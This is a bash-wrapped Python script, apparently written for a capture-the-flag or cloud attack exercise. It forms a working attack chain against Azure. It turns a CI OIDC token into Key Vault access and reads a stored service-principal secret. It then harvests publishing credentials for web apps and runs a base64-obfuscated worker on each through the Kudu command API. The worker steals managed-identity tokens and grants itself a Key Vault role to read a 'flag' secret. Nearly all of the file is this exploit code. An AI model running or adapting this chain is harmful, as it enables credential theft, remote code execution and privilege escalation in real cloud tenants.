#!/usr/bin/env bash
set +e
python3 - <<'PY'
import base64,json,os,time,urllib.parse,urllib.request,urllib.error,uuid
TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"; CID="72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"; KV1="https://kv-tbl-prod-x3euoz.vault.azure.net"
def P(x): print("OUT="+json.dumps(x,default=str)[:4000],flush=True)
def rd(req,t=30): return json.loads(urllib.request.urlopen(req,timeout=t).read().decode())
def form(u,f): return rd(urllib.request.Request(u,data=urllib.parse.urlencode(f).encode(),method="POST"))
def arm_call(url,tok,method="GET",body=None):
  try:
    r=urllib.request.urlopen(urllib.request.Request(url,data=(json.dumps(body).encode() if body is not None else None),method=method,headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"}),timeout=30)
    return r.status, r.read().decode("utf-8","replace")
  except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")[:500]
try:
  oidc=rd(urllib.request.Request(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api%3A%2F%2FAzureADTokenExchange",headers={"Authorization":"Bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]}))["value"]
  vt=form("https://login.microsoftonline.com/"+TEN+"/oauth2/v2.0/token",{"client_id":CID,"grant_type":"client_credentials","scope":"https://vault.azure.net/.default","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":oidc})["access_token"]
  sp=json.loads(rd(urllib.request.Request(KV1+"/secrets/reporting-service-principal?api-version=7.4",headers={"Authorization":"Bearer "+vt}))["value"])
  arm=form("https://login.microsoftonline.com/"+TEN+"/oauth2/v2.0/token",{"client_id":sp.get("appId"),"grant_type":"client_credentials","client_secret":sp.get("clientSecret"),"scope":"https://management.azure.com/.default"})["access_token"]
  # liệt kê web apps reporting-service thấy
  st,sites=arm_call("https://management.azure.com/subscriptions/"+SUB+"/providers/Microsoft.Web/sites?api-version=2023-01-01",arm)
  apps=[(s["name"],s["id"]) for s in json.loads(sites).get("value",[])] if st==200 else []
  P({"stage":"webapps","status":st,"apps":apps})
  for name,rid in apps:
    for attempt in range(3):
      ps,pb=arm_call("https://management.azure.com"+rid+"/config/publishingcredentials/list?api-version=2023-01-01",arm,"POST",{})
      if ps==200: break
      time.sleep(5)
    P({"stage":"pubcreds","app":name,"status":ps})
    if ps!=200: continue
    pub=json.loads(pb)["properties"]; auth=base64.b64encode((pub["publishingUserName"]+":"+pub["publishingPassword"]).encode()).decode()
    scm=pub.get("scmUri","").split("@")[-1] or (name+".scm.azurewebsites.net")
    worker='''import base64,json,os,time,urllib.parse,urllib.request,urllib.error,uuid
SUB="%s"
def o(x):print("WORKER="+json.dumps(x,default=str)[:4000],flush=True)
def jc(t,k):
 try:
  p=t.split(".")[1]+"="*(-len(t.split(".")[1])%%4);return json.loads(base64.urlsafe_b64decode(p.encode())).get(k)
 except:return None
IE=os.environ.get("IDENTITY_ENDPOINT","");IH=os.environ.get("IDENTITY_HEADER","")
o({"ie":IE,"h":bool(IH),"wk":[k for k in os.environ if "IDENT" in k or k.startswith("MSI")]})
def tok(res):
 for ex in ("","&client_id=7a85156a-01c4-4e61-8472-40a92107159b"):
  try:
   d=json.loads(urllib.request.urlopen(urllib.request.Request(IE+"?resource="+urllib.parse.quote(res,safe="")+"&api-version=2019-08-01"+ex,headers={"X-IDENTITY-HEADER":IH}),timeout=5).read().decode())
   if d.get("access_token"):return d["access_token"]
  except Exception as e: o({"toke":repr(e)[:150]})
 return None
def c(u,t,m="GET",b=None):
 try:
  r=urllib.request.urlopen(urllib.request.Request(u,data=(json.dumps(b).encode() if b is not None else None),method=m,headers={"Authorization":"Bearer "+t,"Content-Type":"application/json"}),timeout=25);return r.status,r.read().decode("utf-8","replace")[:3000]
 except urllib.error.HTTPError as e:return e.code,e.read().decode("utf-8","replace")[:600]
 except Exception as e:return 0,repr(e)
vt=tok("https://vault.azure.net");at=tok("https://management.azure.com")
if not vt: o({"err":"no MI token"})
else:
 s,b=c("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4",vt)
 o({"flag_direct":s,"b":b})
 if s!=200 and at:
  sc="subscriptions/"+SUB+"/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
  ra="https://management.azure.com/"+sc+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2022-04-01"
  bd={"properties":{"roleDefinitionId":"/subscriptions/"+SUB+"/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":jc(vt,"oid"),"principalType":"ServicePrincipal"}}
  o({"grant":c(ra,at,"PUT",bd)})
  for i in range(8):
   s,b=c("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4",tok("https://vault.azure.net"));o({"flag":s,"b":b,"try":i+1})
   if s==200:break
   time.sleep(4)
'''%SUB
    b64=base64.b64encode((worker).encode()).decode()
    cmd="python3 -c \"import base64;exec(base64.b64decode('"+b64+"').decode())\""
    try:
      r=urllib.request.urlopen(urllib.request.Request("https://"+scm+"/api/command",data=json.dumps({"command":cmd,"dir":"site/wwwroot"}).encode(),method="POST",headers={"Authorization":"Basic "+auth,"Content-Type":"application/json"}),timeout=120).read().decode("utf-8","replace")
      print("KUDU="+r[:20000],flush=True)
    except Exception as e: P({"stage":"kuduerr","app":name,"e":repr(e)[:300]})
except Exception as e: P({"stage":"outer","e":repr(e)})
PY
